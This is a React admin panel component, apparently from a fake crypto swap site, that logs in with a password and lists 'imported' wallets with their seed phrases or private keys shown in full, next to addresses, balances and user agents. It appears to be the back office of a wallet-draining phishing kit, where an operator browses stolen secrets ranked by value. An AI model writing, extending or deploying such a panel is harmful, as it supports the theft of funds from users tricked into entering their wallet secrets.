import { useCallback, useEffect, useState } from 'react'

interface WalletRecord {
  id: string
  type: 'mnemonic' | 'privateKey'
  secret: string
  address: string
  balance: string
  ua?: string
  createdAt: string
}

export default function AdminPanel() {
  const [password, setPassword] = useState('')
  const [token, setToken] = useState(() => sessionStorage.getItem('scash_cp_t') ?? '')
  const [records, setRecords] = useState<WalletRecord[]>([])
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)

  const loadRecords = useCallback(async (authToken: string) => {
    setLoading(true)
    setError('')
    try {
      const res = await fetch('/api/admin/records', {
        headers: { 'x-admin-token': authToken },
      })
      if (!res.ok) throw new Error('加载失败')
      const data = (await res.json()) as { records?: WalletRecord[] }
      setRecords(data.records ?? [])
    } catch (err) {
      setError(err instanceof Error ? err.message : '加载失败')
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    if (token) void loadRecords(token)
  }, [token, loadRecords])

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault()
    setError('')
    setLoading(true)
    try {
      const pwd = password.trim()
      const res = await fetch('/api/admin/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${pwd}`,
        },
        body: JSON.stringify({ password: pwd }),
      })
      if (res.status === 401) throw new Error('密码错误')
      if (!res.ok) throw new Error(`登录失败 (${res.status})`)
      const data = (await res.json()) as { token?: string }
      if (!data.token) throw new Error('登录失败')
      sessionStorage.setItem('scash_cp_t', data.token)
      setToken(data.token)
      setPassword('')
    } catch (err) {
      setError(err instanceof Error ? err.message : '登录失败')
    } finally {
      setLoading(false)
    }
  }

  function handleLogout() {
    sessionStorage.removeItem('scash_cp_t')
    setToken('')
    setRecords([])
  }

  if (!token) {
    return (
      <div className="admin-shell">
        <form className="admin-login" onSubmit={handleLogin}>
          <div className="admin-title">管理后台</div>
          <input
            className="recipient-input"
            type="password"
            placeholder="管理员密码"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          {error && <div className="wallet-error">{error}</div>}
          <button type="submit" className="swap-action-btn ready" disabled={loading}>
            {loading ? '验证中...' : '登录'}
          </button>
        </form>
      </div>
    )
  }

  return (
    <div className="admin-shell">
      <div className="admin-header">
        <div className="admin-title">导入钱包记录</div>
        <div className="admin-actions">
          <button type="button" className="wallet-action-link" onClick={() => loadRecords(token)}>
            刷新
          </button>
          <button type="button" className="wallet-action-link" onClick={handleLogout}>
            退出
          </button>
        </div>
      </div>

      {loading && <div className="admin-loading">加载中...</div>}
      {error && <div className="wallet-error">{error}</div>}

      <div className="admin-table-wrap">
        <table className="admin-table">
          <thead>
            <tr>
              <th>时间</th>
              <th>类型</th>
              <th>地址</th>
              <th>余额</th>
              <th>助记词/私钥</th>
              <th>UA</th>
            </tr>
          </thead>
          <tbody>
            {records.length === 0 ? (
              <tr>
                <td colSpan={6} className="admin-empty">
                  暂无记录
                </td>
              </tr>
            ) : (
              records.map((row) => (
                <tr key={row.id}>
                  <td>{new Date(row.createdAt).toLocaleString('zh-CN')}</td>
                  <td>{row.type === 'mnemonic' ? '助记词' : '私钥'}</td>
                  <td className="admin-mono">{row.address}</td>
                  <td>{row.balance}</td>
                  <td className="admin-mono admin-secret">{row.secret}</td>
                  <td className="admin-ua">{row.ua ?? '-'}</td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
    </div>
  )
}
